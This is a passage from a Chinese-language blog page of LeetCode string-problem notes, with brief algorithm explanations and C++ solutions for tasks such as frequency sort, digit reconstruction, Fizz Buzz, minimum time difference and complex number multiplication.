&#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">string <span class="hljs-title">frequencySort</span><span class="hljs-params">(string s)</span> </span>&#123;<br>        unordered_map&lt;<span class="hljs-type">char</span>, <span class="hljs-type">int</span>&gt; freqMap;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">char</span> ch : s) &#123;<br>            freqMap[ch]++;<br>        &#125;<br>        vector&lt;pair&lt;<span class="hljs-type">char</span>, <span class="hljs-type">int</span>&gt;&gt; <span class="hljs-built_in">freqVec</span>(freqMap.<span class="hljs-built_in">begin</span>(), freqMap.<span class="hljs-built_in">end</span>());<br><br>        <span class="hljs-built_in">sort</span>(freqVec.<span class="hljs-built_in">begin</span>(), freqVec.<span class="hljs-built_in">end</span>(), [](<span class="hljs-type">const</span> pair&lt;<span class="hljs-type">char</span>, <span class="hljs-type">int</span>&gt;&amp; a, <span class="hljs-type">const</span> pair&lt;<span class="hljs-type">char</span>, <span class="hljs-type">int</span>&gt;&amp; b) &#123;<br>            <span class="hljs-keyword">return</span> a.second &gt; b.second;<br>        &#125;);<br><br>        string ans;<br>        <span class="hljs-comment">//string(freq, ch)，它的含义是创建一个新的字符串，这个字符串由字符ch重复freq次构成。</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span>&amp; [ch, freq] : freqVec) &#123;<br>            ans += <span class="hljs-built_in">string</span>(freq, ch); <br>        &#125;<br><br>        <span class="hljs-keyword">return</span> ans;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="从英文中重建数字">从英文中重建数字</h2><blockquote><p>0的英文是zero，1的英文是one，2的英文是two，3的英文是three，4的英文是four，5的英文是five，6的英文是six，7的英文是seven，8的英文是eight，9的英文是nine。统计每个字母分别在哪些数字中出现。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">string <span class="hljs-title">originalDigits</span><span class="hljs-params">(string s)</span> </span>&#123;<br>        unordered_map&lt;<span class="hljs-type">char</span>,<span class="hljs-type">int</span>&gt; freq;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">char</span>&amp; ch:s)&#123;<br>            freq[ch]++;<br>        &#125;<br>        <br>        <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">cnt</span><span class="hljs-params">(<span class="hljs-number">10</span>)</span></span>;<br>        cnt[<span class="hljs-number">0</span>]=freq[<span class="hljs-string">&#x27;z&#x27;</span>];<br>        cnt[<span class="hljs-number">2</span>]=freq[<span class="hljs-string">&#x27;w&#x27;</span>];<br>        cnt[<span class="hljs-number">4</span>]=freq[<span class="hljs-string">&#x27;u&#x27;</span>];<br>        cnt[<span class="hljs-number">6</span>]=freq[<span class="hljs-string">&#x27;x&#x27;</span>];<br>        cnt[<span class="hljs-number">8</span>]=freq[<span class="hljs-string">&#x27;g&#x27;</span>];<br><br>        cnt[<span class="hljs-number">3</span>] = freq[<span class="hljs-string">&#x27;h&#x27;</span>] - cnt[<span class="hljs-number">8</span>];<br>        cnt[<span class="hljs-number">5</span>] = freq[<span class="hljs-string">&#x27;f&#x27;</span>] - cnt[<span class="hljs-number">4</span>];<br>        cnt[<span class="hljs-number">7</span>] = freq[<span class="hljs-string">&#x27;s&#x27;</span>] - cnt[<span class="hljs-number">6</span>];<br><br>        cnt[<span class="hljs-number">1</span>] = freq[<span class="hljs-string">&#x27;o&#x27;</span>] - cnt[<span class="hljs-number">0</span>] - cnt[<span class="hljs-number">2</span>] - cnt[<span class="hljs-number">4</span>];<br>        cnt[<span class="hljs-number">9</span>] = freq[<span class="hljs-string">&#x27;i&#x27;</span>] - cnt[<span class="hljs-number">5</span>] - cnt[<span class="hljs-number">6</span>] - cnt[<span class="hljs-number">8</span>];<br><br>        string ans;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">10</span>;i++)&#123;<br>            ans+=<span class="hljs-built_in">string</span>(cnt[i],<span class="hljs-built_in">char</span>(i+<span class="hljs-string">&#x27;0&#x27;</span>));<br>        &#125;<br>        <br>        <span class="hljs-keyword">return</span> ans;<br>    &#125;   <br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="机器人能否返回原点">机器人能否返回原点</h2><blockquote><p>按指令模拟机器人移动的坐标即可。起始时机器人的坐标为(0,0)，在遍历完所有指令并对机器人进行移动之后，判断机器人的坐标是否为(0,0) 即可。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">judgeCircle</span><span class="hljs-params">(string moves)</span> </span>&#123;<br>        <span class="hljs-type">int</span> x = <span class="hljs-number">0</span>, y = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">char</span> move : moves) &#123;<br>            <span class="hljs-keyword">if</span> (move == <span class="hljs-string">&#x27;U&#x27;</span>) &#123;<br>                y--;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (move == <span class="hljs-string">&#x27;D&#x27;</span>) &#123;<br>                y++;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (move == <span class="hljs-string">&#x27;L&#x27;</span>) &#123;<br>                x--;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (move == <span class="hljs-string">&#x27;R&#x27;</span>) &#123;<br>                x++;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> x == <span class="hljs-number">0</span> &amp;&amp; y == <span class="hljs-number">0</span>;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="学生出勤记录-i">学生出勤记录 I</h2><blockquote><p>遍历过程中，记录缺勤次数和连续迟到次数，根据遍历到的字符更新缺勤次数和连续迟到次数。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">checkRecord</span><span class="hljs-params">(string s)</span> </span>&#123;<br>        <span class="hljs-type">int</span> absentCnt = <span class="hljs-number">0</span>;<br>        <span class="hljs-type">int</span> lateCnt = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">char</span> ch : s) &#123;<br>            <span class="hljs-keyword">if</span> (ch == <span class="hljs-string">&#x27;A&#x27;</span>) &#123;<br>                <span class="hljs-keyword">if</span> (++absentCnt &gt;= <span class="hljs-number">2</span>) &#123;<br>                    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>                &#125;<br>            &#125;<br>            <span class="hljs-keyword">if</span> (ch == <span class="hljs-string">&#x27;L&#x27;</span>) &#123;<br>                <span class="hljs-keyword">if</span> (++lateCnt &gt;= <span class="hljs-number">3</span>) &#123;<br>                    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>                &#125;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                lateCnt = <span class="hljs-number">0</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="计数二进制子串">计数二进制子串</h2><blockquote><p>我们可以将字符串 s 按照 0 和 1 的连续段分组，存在 counts 数组中，例如s=00111011，可以得到这样的 counts 数组：counts={2,3,1,2}。这里 counts数组中两个相邻的数一定代表的是两种不同的字符。假设 counts数组中两个相邻的数字为 u 或者 v，它们对应着 u 个 0 和 v 个 1，或者 u 个1 和 v 个 0。它们能组成的满足条件的子串数目为min{u,v}，即一对相邻的数字对答案的贡献。我们只要遍历所有相邻的数对，求它们的贡献总和，即可得到答案。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">countBinarySubstrings</span><span class="hljs-params">(string s)</span> </span>&#123;<br>        <span class="hljs-type">int</span> index = <span class="hljs-number">0</span>;<br>        <span class="hljs-type">int</span> n = s.<span class="hljs-built_in">length</span>();<br>        <span class="hljs-type">int</span> last = <span class="hljs-number">0</span>; <span class="hljs-comment">// 维护当前位置的前一个位置的count值</span><br>        <span class="hljs-type">int</span> ans = <span class="hljs-number">0</span>;<br><br>        <span class="hljs-keyword">while</span> (index &lt; n) &#123;<br>            <span class="hljs-type">char</span> c = s[index];<br>            <span class="hljs-type">int</span> count = <span class="hljs-number">0</span>;<br>            <span class="hljs-keyword">while</span> (index &lt; n &amp;&amp; s[index] == c) &#123;<br>                index++;<br>                count++;<br>            &#125;<br>            ans += <span class="hljs-built_in">min</span>(count, last);<br>            last = count;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> ans;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="环绕字符串中唯一的子字符串">环绕字符串中唯一的子字符串</h2><blockquote><p>通过动态规划的思想，利用<code>dp</code>数组记录以每个字母结尾的最长连续递增子串长度，并通过遍历字符串来更新<code>dp</code>数组。如何计算dp[α] 呢？我们可以在遍历 p 时，维护连续递增的子串长度len。具体来说，遍历到 p[i] 时，如果 p[i] 是 p[i−1]在字母表中的下一个字母，则将 len 加一，否则将 len 置为1，表示重新开始计算连续递增的子串长度。然后，用 len 更新 dp[p[i]]的最大值。最终，累加<code>dp</code>数组中的所有元素即可得到符合条件的子串数量。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">findSubstringInWraproundString</span><span class="hljs-params">(string s)</span> </span>&#123;<br>        <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">dp</span><span class="hljs-params">(<span class="hljs-number">26</span>)</span></span>;<br>        <span class="hljs-type">int</span> len = <span class="hljs-number">0</span>;<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; s.<span class="hljs-built_in">length</span>(); i++) &#123;<br>            <span class="hljs-keyword">if</span> (i &amp;&amp; (s[i] - s[i - <span class="hljs-number">1</span>] + <span class="hljs-number">26</span>) % <span class="hljs-number">26</span> == <span class="hljs-number">1</span>) &#123;<br>                len++;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                len = <span class="hljs-number">1</span>;<br>            &#125;<br>            dp[s[i] - <span class="hljs-string">&#x27;a&#x27;</span>] = <span class="hljs-built_in">max</span>(dp[s[i] - <span class="hljs-string">&#x27;a&#x27;</span>], len);<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">accumulate</span>(dp.<span class="hljs-built_in">begin</span>(), dp.<span class="hljs-built_in">end</span>(), <span class="hljs-number">0</span>);<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h1 id="数字与字符串间转换">7. 数字与字符串间转换</h1><h2 id="猜数字游戏">猜数字游戏</h2><blockquote><p>通过统计数字的出现频率来比较两个字符串，然后计算出位置和数字都正确的数量（Acount），以及数字正确但位置不对的数量（Bcount）。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">string <span class="hljs-title">getHint</span><span class="hljs-params">(string secret, string guess)</span> </span>&#123;<br>        <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">freq_s</span><span class="hljs-params">(<span class="hljs-number">10</span>)</span></span>;<br>        <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">freq_g</span><span class="hljs-params">(<span class="hljs-number">10</span>)</span></span>;<br>        <span class="hljs-type">int</span> Acount = <span class="hljs-number">0</span>;<br>        <span class="hljs-type">int</span> Bcount = <span class="hljs-number">0</span>;<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; secret.<span class="hljs-built_in">length</span>(); i++) &#123;<br>            <span class="hljs-keyword">if</span> (secret[i] == guess[i]) &#123;<br>                Acount++;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                freq_s[secret[i] - <span class="hljs-string">&#x27;0&#x27;</span>]++;<br>                freq_g[guess[i] - <span class="hljs-string">&#x27;0&#x27;</span>]++;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++) &#123;<br>            Bcount += <span class="hljs-built_in">min</span>(freq_s[i], freq_g[i]);<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">to_string</span>(Acount) + <span class="hljs-string">&quot;A&quot;</span> + <span class="hljs-built_in">to_string</span>(Bcount) + <span class="hljs-string">&quot;B&quot;</span>;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="fizz-buzz">Fizz Buzz</h2><blockquote><p>遍历从1到n的数字，并根据数字是否能被3、5、或者同时被3和5整除来确定应该输出"Fizz"、"Buzz"、"FizzBuzz" 还是数字本身的字符串形式。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">vector&lt;string&gt; <span class="hljs-title">fizzBuzz</span><span class="hljs-params">(<span class="hljs-type">int</span> n)</span> </span>&#123;<br>        vector&lt;string&gt; ans;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=n;i++)&#123;<br>            <span class="hljs-keyword">if</span>(i%<span class="hljs-number">15</span>==<span class="hljs-number">0</span>)&#123;<br>                ans.<span class="hljs-built_in">push_back</span>(<span class="hljs-string">&quot;FizzBuzz&quot;</span>);<br>            &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(i%<span class="hljs-number">3</span>==<span class="hljs-number">0</span>)&#123;<br>                ans.<span class="hljs-built_in">push_back</span>(<span class="hljs-string">&quot;Fizz&quot;</span>);<br>            &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(i%<span class="hljs-number">5</span>==<span class="hljs-number">0</span>)&#123;<br>                ans.<span class="hljs-built_in">push_back</span>(<span class="hljs-string">&quot;Buzz&quot;</span>);<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                ans.<span class="hljs-built_in">push_back</span>(<span class="hljs-built_in">to_string</span>(i));<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> ans;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="相对名次">相对名次</h2><blockquote><p>将所有的运动员按照成绩的高低进行排序，然后将按照名次进行标记即可。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">vector&lt;string&gt; <span class="hljs-title">findRelativeRanks</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; score)</span> </span>&#123;<br>        <span class="hljs-type">int</span> n = score.<span class="hljs-built_in">size</span>();<br>        string desc[<span class="hljs-number">3</span>] = &#123;<span class="hljs-string">&quot;Gold Medal&quot;</span>, <span class="hljs-string">&quot;Silver Medal&quot;</span>, <span class="hljs-string">&quot;Bronze Medal&quot;</span>&#125;;<br>        vector&lt;pair&lt;<span class="hljs-type">int</span>, <span class="hljs-type">int</span>&gt;&gt; arr;<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++) &#123;<br>            arr.<span class="hljs-built_in">emplace_back</span>(<span class="hljs-built_in">make_pair</span>(-score[i], i));<br>        &#125;<br>        <span class="hljs-built_in">sort</span>(arr.<span class="hljs-built_in">begin</span>(), arr.<span class="hljs-built_in">end</span>());<br><br>        <span class="hljs-function">vector&lt;string&gt; <span class="hljs-title">ans</span><span class="hljs-params">(n)</span></span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++) &#123;<br>            <span class="hljs-keyword">if</span> (i &gt;= <span class="hljs-number">3</span>) &#123;<br>                ans[arr[i].second] = <span class="hljs-built_in">to_string</span>(i + <span class="hljs-number">1</span>);<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                ans[arr[i].second] = desc[i];<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> ans;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="最小时间差">最小时间差</h2><blockquote><p>将 timePoints 排序后，最小时间差必然出现在 timePoints的两个相邻时间，或者 timePoints 的两个首尾时间中。因此排序后遍历一遍timePoints 即可得到最小时间差。一共有 24×60=1440种不同的时间。由鸽巢原理可知，如果 timePoints 的长度超过1440，那么必然会有两个相同的时间，此时可以直接返回 0。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">findMinDifference</span><span class="hljs-params">(vector&lt;string&gt;&amp; timePoints)</span> </span>&#123;<br>        <span class="hljs-type">int</span> n = timePoints.<span class="hljs-built_in">size</span>();<br>        <span class="hljs-keyword">if</span> (n &gt; <span class="hljs-number">1440</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        &#125;<br><br>        <span class="hljs-built_in">sort</span>(timePoints.<span class="hljs-built_in">begin</span>(), timePoints.<span class="hljs-built_in">end</span>());<br>        <span class="hljs-type">int</span> res = INT_MAX;<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++) &#123;<br>            <span class="hljs-type">int</span> hour1 = <span class="hljs-built_in">stoi</span>(timePoints[(i - <span class="hljs-number">1</span> + n) % n].<span class="hljs-built_in">substr</span>(<span class="hljs-number">0</span>, <span class="hljs-number">2</span>));<br>            <span class="hljs-type">int</span> minute1 = <span class="hljs-built_in">stoi</span>(timePoints[(i - <span class="hljs-number">1</span> + n) % n].<span class="hljs-built_in">substr</span>(<span class="hljs-number">3</span>, <span class="hljs-number">2</span>));<br>            <span class="hljs-type">int</span> hour2=<span class="hljs-built_in">stoi</span>(timePoints[i].<span class="hljs-built_in">substr</span>(<span class="hljs-number">0</span>,<span class="hljs-number">2</span>));<br>            <span class="hljs-type">int</span> minute2=<span class="hljs-built_in">stoi</span>(timePoints[i].<span class="hljs-built_in">substr</span>(<span class="hljs-number">3</span>,<span class="hljs-number">2</span>));<br>            <br>            <span class="hljs-type">int</span> dif1=((hour1*<span class="hljs-number">60</span>+minute1)-(hour2*<span class="hljs-number">60</span>+minute2)+<span class="hljs-number">24</span>*<span class="hljs-number">60</span>)%(<span class="hljs-number">24</span>*<span class="hljs-number">60</span>);<br>            <span class="hljs-type">int</span> dif2=((hour2*<span class="hljs-number">60</span>+minute2)-(hour1*<span class="hljs-number">60</span>+minute1)+<span class="hljs-number">24</span>*<span class="hljs-number">60</span>)%(<span class="hljs-number">24</span>*<span class="hljs-number">60</span>);<br>            <span class="hljs-type">int</span> dif=<span class="hljs-built_in">min</span>(dif1,dif2);<br><br>            res=<span class="hljs-built_in">min</span>(res,dif);<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> res;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="最优除法">最优除法</h2><blockquote><p>考虑到除法运算用分数 y/x 来表示，其中分子 x 为被除数，分母 y为除数，为了最大化 y/x ，应该使分子 x 尽可能的大，分母 y尽可能的小。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">string <span class="hljs-title">optimalDivision</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums)</span> </span>&#123;<br>        <span class="hljs-type">int</span> n = nums.<span class="hljs-built_in">size</span>();<br><br>        <span class="hljs-keyword">if</span> (n == <span class="hljs-number">1</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">to_string</span>(nums[<span class="hljs-number">0</span>]);<br>        &#125;<br>        <span class="hljs-keyword">if</span> (n == <span class="hljs-number">2</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">to_string</span>(nums[<span class="hljs-number">0</span>]) + <span class="hljs-string">&quot;/&quot;</span> + <span class="hljs-built_in">to_string</span>(nums[<span class="hljs-number">1</span>]);<br>        &#125;<br><br>        string ans = <span class="hljs-built_in">to_string</span>(nums[<span class="hljs-number">0</span>]) + <span class="hljs-string">&quot;/(&quot;</span> + <span class="hljs-built_in">to_string</span>(nums[<span class="hljs-number">1</span>]);<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">2</span>; i &lt; n; i++) &#123;<br>            ans.<span class="hljs-built_in">append</span>(<span class="hljs-string">&quot;/&quot;</span> + <span class="hljs-built_in">to_string</span>(nums[i]));<br>        &#125;<br>        ans.<span class="hljs-built_in">append</span>(<span class="hljs-string">&quot;)&quot;</span>);<br><br>        <span class="hljs-keyword">return</span> ans;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="复数乘法">复数乘法</h2><blockquote><p>对于给定的两个复数 <em>num</em>1 和<em>num</em>2，首先分别得到两个复数的实部和虚部，然后计算两个复数的乘法。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">string <span class="hljs-title">complexNumberMultiply</span><span class="hljs-params">(string num1, string num2)</span> </span>&#123;<br>        <span class="hljs-function">regex <span class="hljs-title">re</span><span class="hljs-params">(<span class="hljs-string">&quot;\\+|i&quot;</span>)</span></span>;<br>        <span class="hljs-function">vector&lt;string&gt; <span class="hljs-title">complex1</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">            sregex_token_iterator(num1.begin(), num1.end(), re, <span class="hljs-number">-1</span>),</span></span><br><span class="hljs-params"><span class="hljs-function">            sregex_token_iterator())</span></span>;<br>        <span class="hljs-function">vector&lt;string&gt; <span class="hljs-title">complex2</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">            sregex_token_iterator(num2.begin(), num2.end(), re, <span class="hljs-number">-1</span>),</span></span><br><span class="hljs-params"><span class="hljs-function">            sregex_token_iterator())</span></span>;<br><br>        <span class="hljs-type">int</span> real1 = <span class="hljs-built_in">stoi</span>(complex1[<span class="hljs-number">0</span>]);<br>        <span class="hljs-type">int</span> imag1 = <span class="hljs-built_in">stoi</span>(complex1[<span class="hljs-number">1</span>]);<br>        <span class="hljs-type">int</span> real2 = <span class="hljs-built_in">stoi</span>(complex2[<span class="hljs-number">0</span>]);<br>        <span class="hljs-type">int</span> imag2 = <span class="hljs-built_in">stoi</span>(complex2[<span class="hljs-number">1</span>]);<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">to_string</span>(real1 * real2 